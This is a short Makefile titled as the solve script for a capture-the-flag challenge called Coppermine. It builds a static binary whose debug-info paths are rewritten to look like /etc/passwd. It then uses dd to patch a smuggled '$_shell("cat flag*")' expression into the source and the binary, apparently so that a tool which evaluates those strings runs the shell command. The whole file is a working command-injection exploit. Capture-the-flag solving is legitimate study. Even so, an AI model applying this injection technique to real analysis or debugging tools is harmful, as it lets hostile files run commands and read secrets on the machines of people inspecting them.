# Coppermine's solve script
AS := REPLACE_ME
FNAME := passwd
CFLAGS := -ggdb3 -ffreestanding -nostartfiles -nostdlib -static -ffile-prefix-map=$$PWD=/etc
val := \$$_shell(\"cat flag*\")||0

exploit: a
	cp $< $@; \
	offset=$$(grep -abo $(AS) $@ | cut -d: -f1); \
	printf "%s\0" "$(val)" | dd of=$@ bs=1 seek=$$offset conv=notrunc;

a: a.c
	cp $^ $(FNAME)
	sed -i s/AS/$(AS)/g $(FNAME)
	$(CC) $(CFLAGS) -o $@ -x c $(FNAME)
	offset=$$(grep -abo $(AS) $(FNAME) | cut -d: -f1 | head -n1); \
	printf "%s " "$(val)" | dd of=$(FNAME) bs=1 seek=$$offset conv=notrunc
	rm $(FNAME)
